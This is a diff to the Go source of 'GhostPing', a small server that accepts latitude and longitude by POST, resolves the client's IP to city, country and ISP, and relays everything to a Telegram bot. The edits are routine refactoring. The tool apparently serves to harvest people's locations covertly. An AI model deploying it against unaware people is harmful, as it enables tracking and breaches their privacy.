@@ -19,9 +19,10 @@ type IPInfo struct {
 	ISP     string `json:"isp"`
 }
 
+// Para aceitar float ou string no JSON
 type LocationRequest struct {
-	Latitude  string `json:"latitude"`
-	Longitude string `json:"longitude"`
+	Latitude  json.Number `json:"latitude"`
+	Longitude json.Number `json:"longitude"`
 }
 
 type TelegramMessage struct {
@@ -59,7 +60,11 @@ func usage() {
  :: :: :    :   : :   : :  :   :: : :       :      :        :    ::    :    :: :: :   
                                                                                       
        by k4rkarov (v1.0)
-` + "\033[0m")
+\033[0m`)
+	fmt.Println("\033[32mGhostPing listens for POST requests on /send-location.")
+	fmt.Println("It extracts latitude and longitude from the JSON body,")
+	fmt.Println("resolves the client’s IP into city/country/ISP details,")
+	fmt.Println("then pushes a formatted message to your Telegram bot.\033[0m")
 	fmt.Println("")
 	fmt.Println("Usage: ghostping [options]")
 	fmt.Println("")
@@ -68,12 +73,6 @@ func usage() {
 	fmt.Println("  -chat <CHAT_ID>  Telegram chat ID (required)")
 	fmt.Println("  -port <PORT>     Port to run the server (default: 8088)")
 	fmt.Println("  -h, --help       Show this help message")
-	fmt.Println("")
-	fmt.Println("Description:")
-	fmt.Println("	GhostPing listens for POST requests on /send-location.")
-	fmt.Println("	It extracts latitude and longitude from the JSON body,")
-	fmt.Println("	resolves the client’s IP into city/country/ISP details,")
-	fmt.Println("	then pushes a formatted message to your Telegram bot.")
 }
 
 func getIP(r *http.Request) string {
@@ -109,7 +108,6 @@ func enrichIP(ip string) (*IPInfo, error) {
 
 func sendToTelegram(msg TelegramMessage, token string) error {
 	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
-
 	jsonMsg, _ := json.Marshal(msg)
 	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonMsg))
 	if err != nil {
@@ -143,9 +141,11 @@ func sendLocationHandler(w http.ResponseWriter, r *http.Request) {
 		ipInfo = &IPInfo{}
 	}
 
+	lat := loc.Latitude.String()
+	lon := loc.Longitude.String()
 	mapsLink := "Coordinates not available"
-	if loc.Latitude != "" && loc.Longitude != "" {
-		mapsLink = fmt.Sprintf("[View on Google Maps](https://www.google.com/maps?q=%s,%s)", loc.Latitude, loc.Longitude)
+	if lat != "" && lon != "" {
+		mapsLink = fmt.Sprintf("[View on Google Maps](https://www.google.com/maps?q=%s,%s)", lat, lon)
 	}
 
 	message := fmt.Sprintf(`
@@ -160,8 +160,8 @@ Longitude: %s
 
 🔗 %s
 `,
-		emptyIf(loc.Latitude, "Not provided"),
-		emptyIf(loc.Longitude, "Not provided"),
+		emptyIf(lat, "Not provided"),
+		emptyIf(lon, "Not provided"),
 		ip,
 		emptyIf(ipInfo.City, "N/A"),
 		emptyIf(ipInfo.Country, "N/A"),
@@ -185,7 +185,7 @@ Longitude: %s
 	w.Write([]byte(`{"success": true}`))
 }
 
-func emptyIf(val string, def string) string {
+func emptyIf(val, def string) string {
 	if val == "" {
 		return def
 	}
@@ -195,7 +195,6 @@ func emptyIf(val string, def string) string {
 func main() {
 	flag.Parse()
 
-	// Se nenhum parâmetro for passado
 	if len(os.Args) == 1 {
 		fmt.Println("\033[31mError: no parameters provided\033[0m")
 		fmt.Println("Please check: ghostping -h/--help")
@@ -208,7 +207,7 @@ func main() {
 	}
 
 	if botToken == "" || chatID == "" {
-		fmt.Println("Error: -token and -chat are required")
+		fmt.Println("\033[31mError: -token and -chat are required\033[0m")
 		usage()
 		os.Exit(1)
 	}
